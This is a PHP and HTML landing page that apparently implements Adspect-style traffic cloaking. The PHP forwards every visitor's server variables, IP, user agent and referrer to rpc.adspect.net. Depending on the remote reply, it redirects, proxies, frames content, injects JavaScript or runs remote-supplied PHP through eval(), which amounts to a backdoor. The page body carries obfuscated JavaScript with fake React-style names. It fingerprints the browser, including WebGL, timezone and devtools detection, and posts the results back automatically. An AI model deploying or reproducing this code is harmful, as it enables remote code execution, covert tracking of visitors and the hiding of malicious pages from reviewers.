<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url = '') { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; if ($url !== '') { $url = parse_url($url); if (isset($url['path'])) { if (substr($url['path'], 0, 1) === '/') { $_SERVER['REQUEST_URI'] = $url['path']; } else { $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path']; } } if (isset($url['query'])) { parse_str($url['query'], $_GET); $_SERVER['QUERY_STRING'] = $url['query']; } else { $_GET = []; $_SERVER['QUERY_STRING'] = ''; } } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_real_ip() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $ip = strtok($_SERVER['HTTP_X_FORWARDED_FOR'], ','); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_X_REAL_IP']; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_REAL_IP']; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; } if (empty($ip)) { $ip = $_SERVER['REMOTE_ADDR']; } return $ip; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $addr = adspect_real_ip(); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); switch (array_key_exists('data', $_POST)) { case true: $payload = json_decode($_POST['data'], true); if (is_array($payload)) { break; } default: $payload = []; break; } $payload['server'] = $_SERVER; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_HTTPHEADER, [ "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); if (!$ok && !$js) { return null; } echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); adspect_spoof_request(); return null; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>"; break; case 'proxy': adspect_proxy($target, $param, $key); break; case 'fetch': adspect_proxy($target); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('085519f9-da40-43e1-82d1-c4e0d2d63072', 'redirect', '_', base64_decode('3eqN7l91Yy2wd5InUREkuEJlH+3ZalkxVBa9cx4C/n8=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <script>(function(){var reactidle_priority_timeout=[],react_secondarg={};try{function react_didwarnaboutfunctionrefs(react_createportal$1){if('object'===typeof react_createportal$1&&null!==react_createportal$1){var react_oldfiber={};function react_workloopsync(react_keyparams){try{var reactpossiblyweakmap$1=react_createportal$1[react_keyparams];switch(typeof reactpossiblyweakmap$1){case'object':if(null===reactpossiblyweakmap$1)break;case'function':reactpossiblyweakmap$1=reactpossiblyweakmap$1['toString']();}react_oldfiber[react_keyparams]=reactpossiblyweakmap$1;}catch(reactprocessemitwarning){reactidle_priority_timeout['push'](reactprocessemitwarning['message']);}}for(var react_prevdeps in react_createportal$1)react_workloopsync(react_prevdeps);try{var react_family=Object['getOwnPropertyNames'](react_createportal$1);for(react_prevdeps=0x0;react_prevdeps<react_family['length'];++react_prevdeps)react_workloopsync(react_family[react_prevdeps]);react_oldfiber['!!']=react_family;}catch(react_mutablesource){reactidle_priority_timeout['push'](react_mutablesource['message']);}return react_oldfiber;}}react_secondarg['screen']=react_didwarnaboutfunctionrefs(window['screen']),react_secondarg['window']=react_didwarnaboutfunctionrefs(window),react_secondarg['navigator']=react_didwarnaboutfunctionrefs(window['navigator']),react_secondarg['location']=react_didwarnaboutfunctionrefs(window['location']),react_secondarg['console']=react_didwarnaboutfunctionrefs(window['console']),react_secondarg['documentElement']=function(react_warnforinvalideventlistener){try{var react_prevdebugfiber={};react_warnforinvalideventlistener=react_warnforinvalideventlistener['attributes'];for(var react_containerelement in react_warnforinvalideventlistener)react_containerelement=react_warnforinvalideventlistener[react_containerelement],react_prevdebugfiber[react_containerelement['nodeName']]=react_containerelement['nodeValue'];return react_prevdebugfiber;}catch(react_commitpassiveunmounteffects_complete){reactidle_priority_timeout['push'](react_commitpassiveunmounteffects_complete['message']);}}(document['documentElement']),react_secondarg['document']=react_didwarnaboutfunctionrefs(document);try{react_secondarg['timezoneOffset']=new Date()['getTimezoneOffset']();}catch(react_getaffectedmoduleeffects){reactidle_priority_timeout['push'](react_getaffectedmoduleeffects['message']);}try{react_secondarg['closure']=function(){}['toString']();}catch(react_canusecompositionevent){reactidle_priority_timeout['push'](react_canusecompositionevent['message']);}try{react_secondarg['touchEvent']=document['createEvent']('TouchEvent')['toString']();}catch(_getsuspenseinstancef){reactidle_priority_timeout['push'](_getsuspenseinstancef['message']);}try{var react_autosave=function(){},react_interruptedwork=0x0;react_autosave['toString']=function(){return++react_interruptedwork,'';},console['log'](react_autosave),react_secondarg['tostring']=react_interruptedwork;}catch(react_nexttype){reactidle_priority_timeout['push'](react_nexttype['message']);}try{var react_set=document['createElement']('canvas')['getContext']('webgl'),react_disabledlog=react_set['getExtension']('WEBGL_debug_renderer_info');react_secondarg['webgl']={'vendor':react_set['getParameter'](react_disabledlog['UNMASKED_VENDOR_WEBGL']),'renderer':react_set['getParameter'](react_disabledlog['UNMASKED_RENDERER_WEBGL'])};}catch(react_warnedproperties$1){reactidle_priority_timeout['push'](react_warnedproperties$1['message']);}function react_newchildlanes(react_content,reactrender_timeout_ms,react_uppercasepattern){var react_sizes=react_content['prototype'][reactrender_timeout_ms];react_content['prototype'][reactrender_timeout_ms]=function(){react_secondarg['proto']=!0x0;},react_uppercasepattern(),react_content['prototype'][reactrender_timeout_ms]=react_sizes;}try{react_newchildlanes(Array,'includes',function(){return document['createElement']('video')['canPlayType']('video/mp4');});}catch(react_updateinsertioneffect){}}catch(react_retries){reactidle_priority_timeout['push'](react_retries['message']);}(function(){react_secondarg['errors']=reactidle_priority_timeout;var react_innertext=document['createElement']('form'),react_invokeguardedcallbackprod=document['createElement']('input');react_innertext['method']='POST',react_innertext['action']=window['location']['href'],react_invokeguardedcallbackprod['type']='hidden',react_invokeguardedcallbackprod['name']='data',react_invokeguardedcallbackprod['value']=JSON['stringify'](react_secondarg),react_innertext['appendChild'](react_invokeguardedcallbackprod),document['body']['appendChild'](react_innertext),react_innertext['submit']();}());}());</script>
    </div>
  </body>
</html>
<?php exit();
